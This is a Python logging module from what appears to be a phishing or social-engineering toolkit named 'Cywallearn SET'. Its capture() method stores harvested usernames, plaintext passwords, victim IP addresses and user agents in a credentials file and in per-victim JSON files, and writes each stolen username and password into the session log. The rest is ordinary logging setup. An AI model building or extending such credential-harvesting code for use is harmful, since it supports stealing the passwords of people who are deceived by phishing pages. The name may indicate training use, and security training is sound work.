"""Cywallearn SET - Logging System"""

import os
import logging
from datetime import datetime
from .config import Config

class Logger:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            Config.ensure_dirs()
            
            log_file = os.path.join(Config.LOG_DIR, f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
            
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s | %(levelname)s | %(message)s',
                handlers=[
                    logging.FileHandler(log_file),
                    logging.StreamHandler()
                ]
            )
            cls._instance.logger = logging.getLogger("Cywallearn")
        return cls._instance
    
    def info(self, msg):
        self.logger.info(msg)
    
    def warn(self, msg):
        self.logger.warning(msg)
    
    def error(self, msg):
        self.logger.error(msg)
    
    def capture(self, service, username, password, ip, ua):
        """Log captured credentials"""
        Config.ensure_dirs()
        capture_file = os.path.join(Config.CAPTURE_DIR, "credentials.txt")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        entry = f"""
[+] CAPTURED - {timestamp}
    Service:    {service}
    IP:         {ip}
    User-Agent: {ua}
    Username:   {username}
    Password:   {password}
    {'='*50}
"""
        with open(capture_file, "a", encoding="utf-8") as f:
            f.write(entry)
        
        # Also JSON
        import json
        json_file = os.path.join(Config.CAPTURE_DIR, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{ip.replace('.','_')}.json")
        with open(json_file, "w") as f:
            json.dump({
                "timestamp": timestamp,
                "service": service,
                "ip": ip,
                "user_agent": ua,
                "username": username,
                "password": password
            }, f, indent=2)
        
        self.info(f"Credentials captured: {username}:{password} from {ip}")